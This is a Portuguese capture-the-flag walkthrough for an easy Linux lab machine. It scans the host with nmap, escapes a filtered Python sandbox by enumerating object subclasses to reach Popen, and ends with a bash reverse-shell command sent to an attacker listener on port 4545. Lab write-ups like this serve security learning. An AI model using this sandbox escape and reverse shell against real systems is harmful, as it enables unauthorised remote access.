#Difficult : Easy #OS : Linux
***
## Port Scanning
```sh
nmap 10.10.11.62 -Pn -sV -sC -A -oN scann_tcp
```
![[Pasted image 20250513200209.png]]
Temos uma aplicação rodando em um servidor python(`gunicorn`) na porta `500`, podemos acessa-la e ver a aplicação que está rodando.
****
## Sandbox python
![[Pasted image 20250513200815.png]]

Pelo que parece, a aplicação é uma sandbox que aceita comandos `python`, mas não permite alguns comandos, como `os` ou `import`.

Após uma breve pesquisa, achei um [post da Boiatech](https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes) sobre técnicas de `bypass` de sandboxes, uma delas é utilizando `subclasses`.
![[Pasted image 20250513202503.png]]

Primeiro enumerei quantas subclasses há nessa classe.
![[Pasted image 20250513203115.png]]

Como sei quantas subclasses existem, posso listar todas para achar algum comando útil, como o `popen`, que inicia um novo processo e nos permite interagir ele, controlando o fluxo de entrada e saída.
```python
for i in range(0,722):
    string = str("".__class__.__mro__[1].__subclasses__()[i])
    esc = "Po"+"pen"
    if esc in string:
        print(str(i) + ' - '+ string)
    else:
        print('')
```
![[Pasted image 20250513205028.png]]

Encontrei o `popen` na posição `317`, agora posso utiliza-lo para obter uma `revshell`. Mas primeiro devemos escutar uma porta para receber a shell.
```sh
nc -nvlp 4545
```

Agora podemos executar a `revshell`.
```python
shell = ''.__class__.__mro__[1].__subclasses__()[317]
shell("bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4545 0>&1'", shell=True)
```
***